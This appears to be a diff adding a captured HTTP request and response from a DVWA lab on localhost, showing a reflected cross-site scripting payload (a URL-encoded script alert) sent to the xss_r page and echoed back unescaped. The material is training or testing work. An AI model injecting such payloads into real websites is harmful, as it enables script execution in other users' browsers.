@@ -1,0 +1,13 @@
+GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS-R%27%29%3C%2Fscript%3E HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Lab-Analyzer/1.0
+Cookie: PHPSESSID=<REDACTED_LAB_SESSION>; security=low
+
+=== RESPONSE ===
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Server: Apache/2.4.68 (Debian)
+
+<div class="vulnerable_code_area">
+  <pre>Hello <script>alert('XSS-R')</script></pre>
+</div>
